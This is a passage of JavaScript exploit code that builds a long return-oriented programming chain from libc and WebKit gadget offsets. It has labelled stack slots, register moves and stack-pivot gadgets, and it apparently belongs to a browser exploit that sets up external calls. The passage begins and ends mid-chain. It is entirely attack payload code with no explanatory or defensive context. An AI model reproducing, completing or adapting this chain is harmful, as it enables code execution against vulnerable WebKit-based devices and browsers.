set_gadget(libc_base+759608,); //pop rax
//L437:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1066528, //L438
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1066544, //L439
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L438:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L439:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1066704, //L443
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1066656, //L440
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1066672, //L441
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L440:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L441:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L442:
db([24, 0]); // 0x18
set_gadget(libc_base+759608,); //pop rax
//L443:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848070, //shl rax, cl
libc_base+764760, //pop rsi
ropchain+1066760, //L444
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+144605 //pop rdi
]);
//L444:
db([0, 0]); // 0x0
set_gadgets([
libc_base+478984, //sar edi, cl
libc_base+764760, //pop rsi
ropchain+1066872, //L446
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1066904, //L448
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1066888, //L447
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L446:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L447:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L448:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1067000, //L450
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1066984, //L449
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L449:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L450:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1067096, //L452
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L451:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+763368,); //pop rcx
//L452:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1067184, //L454
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1067200, //L455
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L454:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L455:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1067344, //L459
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1067312, //L457
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1067328, //L458
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L457:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L458:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L459:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1067416, //L461
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L461:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1067472, //L462
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L462:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1067568, //L465
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L464:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+763368,); //pop rcx
//L465:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1067656, //L467
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1067672, //L468
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L467:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L468:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1067832, //L471
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1067864, //L473
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1067816, //L470
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1067848, //L472
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L470:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L471:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L472:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L473:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1067992, //L475
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1068008, //L476
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1067976, //L474
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L474:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L475:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L476:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+755660, //add rax, rcx
libc_base+764760, //pop rsi
ropchain+1068096, //L478
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L478:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1068152, //L479
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L479:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1068224, //L482
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L482:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1068280, //L483
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L483:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1121481, //mov [rax], cl
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
//L485:
libc_base+764760, //pop rsi
ropchain+1068384, //L487
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L486:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+763368,); //pop rcx
//L487:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1068472, //L489
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1068488, //L490
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L489:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L490:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1068648, //L493
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1068680, //L495
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1068632, //L492
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1068664, //L494
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L492:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L493:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L494:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L495:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1068776, //L497
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1068760, //L496
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L496:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L497:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1068864, //L499
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+764760 //pop rsi
]);
//L498:
db([1, 0]); // 0x1
set_gadget(libc_base+759608,); //pop rax
//L499:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1068936, //L501
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L500:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+763368,); //pop rcx
//L501:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
webkit_base+3488438, //mov [rax], ecx
libc_base+764760, //pop rsi
ropchain+1069000, //L504
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L504:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+782311, //pop rsp
ropchain+1057144, //L202
//L235:
libc_base+764760, //pop rsi
ropchain+1069112, //L506
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L505:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L506:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1069200, //L508
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1069216, //L509
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L508:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L509:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1069344, //L512
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1069360, //L513
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760, //pop rsi
ropchain+1069328, //L511
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L511:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L512:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L513:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1069464, //L514
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1069480, //L515
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+568675 //pop r8
]);
//L514:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L515:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1069600, //L516
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1069584, //L517
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+759608 //pop rax
]);
//L517:
db([0, 0]); // 0x0
set_gadget(libc_base+782311,); //pop rsp
//L516:
db([0, 0]); // 0x0
set_gadgets([
libc_base+764760, //pop rsi
ropchain+1069688, //L519
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760, //pop rsi
ropchain+1069672, //L518
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L518:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L519:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1069792, //L520
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1069808, //L521
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+568675 //pop r8
]);
//L520:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L521:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1069928, //L522
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1069912, //L523
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+759608 //pop rax
]);
//L523:
db([0, 0]); // 0x0
set_gadget(libc_base+782311,); //pop rsp
//L522:
db([0, 0]); // 0x0
//_create_extcall:
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1070000, //L524
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
webkit_base+568675 //pop r8
]);
//L524:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1070064, //L526
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
webkit_base+568675 //pop r8
]);
//L526:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L528:
db([32, 0]); // 0x20
set_gadget(libc_base+763368,); //pop rcx
//L529:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1070216, //L531
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1070232, //L532
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L531:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L532:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1070352, //L536
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1070320, //L534
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+144605 //pop rdi
]);
//L534:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
//L535:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+763368,); //pop rcx
//L536:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
webkit_base+20307877, //mov [rax], rcx
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L538:
db([16, 0]); // 0x10
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1070480, //L540
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1070496, //L541
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L540:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L541:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1070640, //L545
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1070608, //L543
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1070624, //L544
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L543:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L544:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L545:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1070712, //L547
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L547:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1070768, //L548
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L548:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1070848, //L550
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L550:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L551:
db([8, 0]); // 0x8
set_gadget(libc_base+759608,); //pop rax
//L552:
db([1, 0]); // 0x1
set_gadgets([
webkit_base+10973692, //imul rax, rcx
libc_base+764760, //pop rsi
ropchain+1070960, //L553
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1070976, //L554
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L553:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L554:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+755660, //add rax, rcx
libc_base+764760, //pop rsi
ropchain+1071064, //L556
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L556:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1071120, //L557
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L557:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1071240, //L560
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L559:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L560:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1071328, //L562
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1071344, //L563
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L562:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L563:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1071488, //L567
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1071456, //L565
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1071472, //L566
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L565:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L566:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L567:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1071560, //L569
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L569:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1071616, //L570
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L570:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1071696, //L572
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L572:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L573:
db([8, 0]); // 0x8
set_gadget(libc_base+759608,); //pop rax
//L574:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+10973692, //imul rax, rcx
libc_base+764760, //pop rsi
ropchain+1071808, //L575
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1071824, //L576
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L575:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L576:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+755660, //add rax, rcx
libc_base+764760, //pop rsi
ropchain+1071912, //L578
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L578:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1071968, //L579
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L579:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1072040, //L582
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L582:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1072096, //L583
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L583:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+20307877, //mov [rax], rcx
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
//L585:
pivot_addr,
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1072248, //L587
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L586:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L587:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1072336, //L589
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1072352, //L590
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L589:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L590:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1072496, //L594
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
